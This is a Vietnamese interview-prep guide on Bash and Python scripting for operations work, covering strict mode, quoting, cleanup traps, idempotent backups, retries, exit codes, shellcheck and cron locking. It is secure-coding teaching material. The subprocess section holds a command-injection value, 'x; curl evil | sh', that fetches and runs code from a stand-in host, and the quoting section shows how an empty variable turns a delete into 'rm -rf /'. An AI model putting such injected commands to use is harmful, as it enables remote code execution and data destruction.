# Câu hỏi phỏng vấn: Scripting & lập trình

## `set -euo pipefail` làm gì? Kể vài trường hợp `set -e` không dừng script.

`-e` thoát khi một lệnh trả khác `0`, `-u` coi biến chưa đặt là lỗi, `pipefail` cho pipeline trả lỗi nếu bất kỳ lệnh
nào trong đó lỗi (không chỉ lệnh cuối).

`-e` không kích hoạt khi lệnh là điều kiện (`if`, `while`, `until`), đứng bên trái `&&`/`||`, có `!` phía trước, không
phải lệnh cuối của pipeline (khi thiếu `pipefail`), nằm trong `local x=$(cmd)` (exit code là của `local`), nằm trong
process substitution `<(cmd)`, và toàn bộ thân một hàm được gọi trong ngữ cảnh điều kiện (`if deploy; then`,
`deploy || rollback`). Ngược lại, `((count++))` khi `count=0` trả `1` và **làm script chết** ở một dòng trông vô hại.

Kết luận tôi rút ra: strict mode là lưới an toàn. Chỗ nào lỗi mang ý nghĩa (gọi mạng, dump DB, SSH), tôi bắt exit code
tường minh (`out=$(cmd) || rc=$?`) và quyết định làm gì; shellcheck bắt phần lớn các bẫy còn lại (SC2155 cho `local`).

## Vì sao phải quote biến trong Bash? Cho một ví dụ quoting sai gây sự cố thật.

Phần không nằm trong ngoặc kép bị **tách từ** theo `IFS` rồi **mở rộng glob**. `rm -rf $dir/cache` với
`dir="/srv/olist shop"` thành `rm -rf /srv/olist` và `shop/cache`. Với `dir` rỗng, `rm -rf "$dir/"` thành `rm -rf /`,
nên ngoài ngoặc kép còn cần `"${dir:?}"` hoặc kiểm trước.

Ví dụ thật nổi tiếng: năm 2015, bản cài của Steam trên Linux có dòng `rm -rf "$STEAMROOT/"*`; khi `STEAMROOT` rỗng
(script bị gọi theo cách không lường trước), nó xoá mọi tệp của user. Bản thân `"$STEAMROOT/"` đã có ngoặc kép, lỗi là
không kiểm biến rỗng. Quy tắc tôi theo: luôn `"$var"`, `"$@"`, `--` trước danh sách tệp, mảng cho danh sách tham số,
không `eval`, và `${var:?}` cho mọi biến đi vào đường dẫn bị xoá.

## Làm sao để một script dọn dẹp tạm thời khi bị dừng giữa chừng?

`trap cleanup EXIT` với `cleanup` xoá tệp tạm, nhả tài nguyên; `trap 'exit 130' INT` và `trap 'exit 143' TERM` để tín
hiệu đi qua `exit` và kích hoạt trap `EXIT`, đồng thời trả đúng quy ước `128 + số tín hiệu`. Cleanup phải chịu được
trạng thái dở dang: khởi tạo biến trước khi đặt trap, kiểm `[[ -n $tmp ]]`, và idempotent.

Hai chi tiết senior: Bash hoãn trap tới khi lệnh foreground xong, nên lệnh dài cần chạy nền và `wait "$!"` nếu phải
phản ứng ngay với tín hiệu chỉ gửi tới script; và `SIGKILL` (OOM, hết `TimeoutStopSec`) không bắt được, nên thiết kế
phải chịu được việc cleanup **không** chạy: ghi vào tệp tạm rồi `rename`, lần chạy sau tự dọn tệp tạm cũ.

## Idempotent nghĩa là gì? Làm sao viết một script backup idempotent?

Chạy một hay nhiều lần ra cùng trạng thái cuối, và lần chạy thừa không tạo tác dụng phụ. Với backup hằng ngày:

1. Tên theo đơn vị idempotent (ngày): `olist-2026-11-01.dump`.
2. Khoá `flock -n` trước khi kiểm, để hai lần chạy không cùng thấy "chưa có".
3. Có bản rồi và checksum khớp thì bỏ qua; có mà hỏng thì làm lại.
4. Dump vào tệp tạm cùng thư mục, kiểm không rỗng, ghi checksum, rồi `mv` (nguyên tử).
5. Retention chỉ chạy sau khi bản mới thành công.

Sai lầm hay gặp: kiểm "tệp có tồn tại" mà không kiểm toàn vẹn, nên bản bị cắt cụt vì đĩa đầy được coi là hợp lệ mãi
mãi; và xoá bản cũ trước khi dump, nên một chuỗi ngày dump lỗi xoá sạch backup.

## Sự cố: sáng nay `/tmp` của một máy app trống trơn, vài service lỗi. Bạn điều tra thế nào?

Ổn định trước: restart service cần tệp trong `/tmp` (socket, PID file) để chúng tạo lại; kiểm có dữ liệu thật nào nằm
trong `/tmp` không (không nên có). Rồi tìm thủ phạm:

- **Khi nào**: `stat /tmp`, journal (`journalctl --since yesterday`), `last reboot`; `systemd-tmpfiles-clean.timer` có
  chạy và cấu hình `/usr/lib/tmpfiles.d/tmp.conf` có đổi không.
- **Ai**: crontab của mọi user (`/var/spool/cron/crontabs`, `/etc/cron.d`), `systemctl list-timers`, auditd nếu có
  (`ausearch -f /tmp`), log của Ansible/CI chạy lên máy đó.
- **Script nghi vấn**: tìm `rm -rf $X/tmp/*` hay `rm -rf "$X"/*` với `X` có thể rỗng. Tái hiện trong sandbox: thư mục
  tạm, `rm` giả trên `PATH`, chạy với tham số thiếu.

Trường hợp kinh điển là cron gọi script dọn dẹp thiếu tham số trên một máy mới dựng (bài Advanced 01). Sửa: kiểm tham
số, `set -u`, `${X:?}`, không `cd` mà không kiểm, shellcheck trong CI, và test chạy script với đầu vào rỗng. Postmortem
không đổ lỗi: lỗi nằm ở chỗ quy trình cho phép script không có test và không qua review chạy bằng root.

## Viết retry thế nào cho đúng? Khi nào **không** được retry?

Bốn phần: chỉ retry lỗi tạm thời (timeout, connection refused, `429`, `502`, `503`, `504`), exponential backoff có trần,
jitter để các client không đồng bộ nhịp, và giới hạn số lần hoặc tổng thời gian (deadline). Tôn trọng `Retry-After`
khi server gửi.

Không retry: lỗi của chính request (`400`, `404`, `422`), lỗi xác thực (`401`, `403`, retry còn làm khoá tài khoản),
và thao tác không idempotent có thể đã thành công (POST tạo đơn hàng timeout sau khi server đã ghi), trừ khi có
idempotency key. Ở hệ nhiều tầng, chỉ retry ở một tầng; 3 tầng mỗi tầng 3 lần là 27 lần đập vào DB đang quá tải.
Thêm retry budget hoặc circuit breaker khi quy mô lớn.

## Exit code nên thiết kế thế nào cho một script healthcheck và một script wrapper?

Exit code là hợp đồng với người gọi. Healthcheck đọc bởi Nagios/Icinga dùng `0` OK, `1` WARNING, `2` CRITICAL, `3`
UNKNOWN, và một dòng trạng thái ra stdout; lỗi không lường trước (response lạ) phải là UNKNOWN, không bao giờ là OK.
Dùng làm Docker `HEALTHCHECK` thì chỉ `0`/`1`. Kubernetes probe chỉ phân biệt `0` và khác `0`, và còn phải chọn liveness
hay readiness: lỗi DB thuộc readiness, đưa vào liveness thì DB chập chờn làm mọi pod restart cùng lúc.

Wrapper (`retry`, `timeout`) phải trả lại exit code của lệnh được bọc, nên mã của chính nó cần tách ra: `timeout` dùng
`124`–`127`, wrapper tự viết có thể dùng `64` (EX_USAGE) từ `sysexits.h`. Ghi bảng mã trong `--help`.

## Vì sao chọn shellcheck? Nó bắt được gì và không bắt được gì?

Vì chi phí gần bằng không (một binary, chạy trong mili giây, tích hợp editor, pre-commit, CI) và nó bắt đúng lớp lỗi gây
sự cố nhiều nhất trong Bash: thiếu ngoặc kép (SC2086, SC2046), `cd` không kiểm (SC2164), `local x=$(...)` che lỗi
(SC2155), parse `ls` (SC2012), `rm -rf "$dir/"` khi `dir` có thể rỗng (SC2115). Không có công cụ tương đương nào phổ
biến và ổn định như vậy cho shell.

Nó không bắt lỗi logic (xoá nhầm release đang chạy), không biết đầu vào thật (biến lấy từ môi trường có thể rỗng), và
không chạy code. Vì vậy cần thêm test chạy thật trên sandbox. Tôi chạy `shellcheck -S style` trong CI và chặn merge khi
có cảnh báo; tắt cảnh báo phải kèm lý do ngay tại directive.

## bats hay pytest để test script Bash?

bats-core viết test bằng Bash (`@test`, `run`, kiểm `$status`, `$output`), gần với script và người chỉ biết Bash viết
được; hợp repo toàn Bash. pytest gọi script qua `subprocess`, mạnh hơn khi test cần fixture phức tạp: HTTP server giả,
kiểm JSON, parametrize hàng chục trường hợp, `tmp_path` tự dọn; hợp repo đã có Python, và một bộ chạy cho cả repo.

Thứ quan trọng hơn công cụ là **seam**: script nhận đường dẫn qua tham số, thời gian qua biến, dùng lệnh ngoài qua
`PATH` để test thay bằng bản giả. Không có seam thì test nào cũng phải đụng hệ thống thật. Và mỗi test bắt lỗi nên được
chứng minh bằng cách chạy nó lên bản lỗi.

## Khi nào bạn bỏ Bash sang Python (hoặc Go)?

Khi script quá khoảng 100 dòng hoặc có luồng điều khiển phức tạp (theo Google Shell Style Guide); khi cần cấu trúc dữ
liệu (map, list lồng), JSON lồng nhau, gọi API có SDK; khi cần chạy song song có xử lý lỗi từng phần; khi cần test kỹ.
Bash vẫn đúng cho entrypoint container, git hook, bước CI ngắn: chỉ nối lệnh có sẵn.

Giữa Python và Go: Python khi team biết Python, công cụ chạy trên laptop/CI, cần viết nhanh; chạy trên host thì chỉ
dùng thư viện chuẩn. Go khi cần một binary tĩnh không runtime (agent trên hàng trăm máy, CLI phát hành cho người
khác), khởi động nhanh, song song nhiều, hoặc làm việc sâu với Kubernetes (client-go, operator).

## `subprocess.run(cmd, shell=True)` có vấn đề gì? Viết lại an toàn thế nào?

Chuỗi được đưa cho `/bin/sh -c`, nên mọi dữ liệu nối vào chuỗi đều có thể thành lệnh: `f"pg_dump {db}"` với
`db = "x; curl evil | sh"` chạy luôn phần sau. Đó là command injection, cùng họ với SQL injection.

Viết lại: `subprocess.run(["pg_dump", "--format=custom", f"--file={out}", db], check=True, timeout=3600,
capture_output=True, text=True)`. Danh sách tham số không qua shell nào. Cấu hình dạng chuỗi thì tách bằng `shlex.split`,
log bằng `shlex.join`. Luôn có `timeout`, luôn kiểm exit code. `shell=True` chỉ chấp nhận khi chuỗi là hằng do mình
viết và thật sự cần pipe/glob của shell, và thường vẫn nên viết lại bằng Python.

## Hai bản của cùng một job cron chạy chồng nhau. Bạn ngăn thế nào trên một máy, và trên ba máy?

Một máy: `flock -n` trên một tệp khoá, tốt nhất giữ qua file descriptor (`exec 9>lock; flock -n 9 || exit 75`) để
kernel nhả khi tiến trình chết, không có khoá mồ côi như PID file hay `mkdir`. Hoặc chuyển sang systemd timer: service
đang chạy thì timer không khởi động lần nữa.

Ba máy: `flock` vô dụng vì mỗi máy một kernel. Lựa chọn: chạy job ở một nơi duy nhất (Kubernetes CronJob với
`concurrencyPolicy: Forbid`, hoặc một máy được chỉ định), hay khoá phân tán: `pg_try_advisory_lock` nếu đã có Postgres,
Kubernetes Lease, etcd/Consul. Khoá phân tán có thể mất khi đang giữ (mạng đứt), nên job phải idempotent và tốt nhất có
fencing token. Tôi ưu tiên "chạy ở một nơi + idempotent" trước khi thêm khoá phân tán.

## Thiết kế: bạn được giao xây bộ script vận hành (bootstrap, healthcheck, backup) cho một ứng dụng mới. Bạn thiết kế thế nào?

Giao diện trước: mỗi script một việc, tham số qua `getopts`, cấu hình qua biến môi trường có mặc định (cổng, URL, đường
dẫn), bảng exit code ghi trong `--help`, stdout cho dữ liệu, stderr cho log có thời điểm.

Tính chất chung: strict mode; kiểm mọi đầu vào trước tác dụng phụ đầu tiên; idempotent (bootstrap kiểm trạng thái trước
khi tạo, backup theo ngày có checksum); ghi nguyên tử; khoá chống chạy chồng; `trap` dọn dẹp; retry có backoff cho bước
chờ dịch vụ (bootstrap chờ Postgres `pg_isready`); healthcheck theo hợp đồng của người gọi.

Chất lượng: shellcheck và test trong CI, test chạy trên sandbox với `pg_dump`/`curl` giả và một lần test tích hợp với
compose thật. Vận hành: chạy bằng systemd timer (có `Persistent=`, log vào journald), metric thời điểm thành công cuối
cho backup, alert khi cũ hơn 26 giờ, và một runbook ngắn. Phát hành qua Git và Ansible, không chép tay lên máy. Script
nào vượt khoảng 100 dòng hoặc cần gọi API thì viết bằng Python ngay từ đầu.

## Một đồng nghiệp đề xuất viết lại toàn bộ 3.000 dòng Bash của team sang Go. Bạn phản hồi thế nào?

Hỏi vấn đề trước giải pháp: script gây sự cố ở đâu, team biết gì, chạy ở đâu. Go có lợi thật (binary tĩnh, kiểu tĩnh,
song song, hệ sinh thái Kubernetes) nhưng cũng có giá: chỉ một người biết, sửa nóng phải build, việc nhỏ dài dòng hơn.

Thường tôi đề xuất: một ADR so sánh Bash, Python, Go theo ràng buộc của team; ranh giới rõ (Bash cho entrypoint, hook,
bước ngắn; ngôn ngữ thật cho logic, API, chạy nhiều máy); chuyển dần theo mức đau, script gây sự cố trước, giữ giao diện
cũ bằng wrapper để crontab và runbook không phải đổi cùng lúc; script ổn định, ngắn, ít đổi thì không chuyển. Viết lại
một lần 3.000 dòng là đánh mất các hành vi ngầm mà người khác dựa vào, và trong lúc đó vẫn phải vận hành bản cũ.
